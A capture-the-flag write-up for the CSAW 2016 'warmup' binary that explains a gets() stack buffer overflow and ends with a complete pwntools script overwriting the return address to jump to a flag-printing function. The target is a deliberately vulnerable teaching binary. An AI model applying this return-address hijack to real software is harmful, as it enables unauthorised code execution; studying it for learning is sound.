**This is a writeup for csaw16 warmup challenge**

Lets take a look at the challenge file
```
file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
```

So far this is the first challenge that we have been given that is in 64-bit and not 32-bit. This will be important later on for our payload.

Lets take a look at our main function
```
void main(void)

{
  char easyFunctionAddress [64];
  char input [64];
 
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(easyFunctionAddress,"%p\n",easy);
  write(1,easyFunctionAddress,9);
  write(1,&DAT_00400755,1);
  gets(input);
  return;
}
```

Ok, so we are allocated two buffers, easyFunctionAddress and input with both having 64 bytes of space. 

The write function in c has three params: file descriptor, buffer, and byte count.

Now the sprintf function has two main parameters: a pointer to the buffer and the file format.

For the sprintf function in this program stores the memory address of the easy function into the the easyFunctionAddress buffer.

So our program output looks like this
```
-Warm Up-
WOW:0x40060d
>
```

If we look at the easy function, we can see that it is making a system call  with the purpose of printing out the flag.
```
void easy(void)

{
  system("cat flag.txt");
  return;
}
```

Now the program is prompting us for an input by using the gets function and is storing this into the input buffer that has 64 bytes of space allocated.

So you're probably thinking about how we can run the easy function, if there is no call to the easy function. Well in the main function, we can see that there is a return function which if we overwrite the return function address with the address we were given for the easy function, then the program will jump into the easy function and print out the flag.

Lets look at our stack so we can see the offset of the input buffer and the return address
```
Stack[-0x48]:1 input
Stack[-0x88]:1 easyFunctionAddress
```

So in the program we know that our input buffer has 64 bytes of space which we can also see in this assembly code
```
00400692    LEA     RAX=>input,[RBP + -0x40]
```

Now in 64-bit files, the return address is 8 bytes above our base pointer which is why on our stack the input addresss has 0x48 space because it is doing 0x40 + 0x8.

Now with this information we can construct our payload so that we overflow the input buffer and then overwrite the return address. Our payload will look like this
```
payload = b"A" * 0x48 + p64(TARGET_ADDRESS)
```

**Final Exploit**
```
from pwn import *

BINARY = "./warmup"
elf = ELF(BINARY)
context.binary = elf

OFFSET = 0x48
TARGET_ADDRESS = elf.symbols["easy"]

payload = b'A' * OFFSET + p64(TARGET_ADDRESS)

def exploit_local():
    r = process(BINARY)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit_local()
```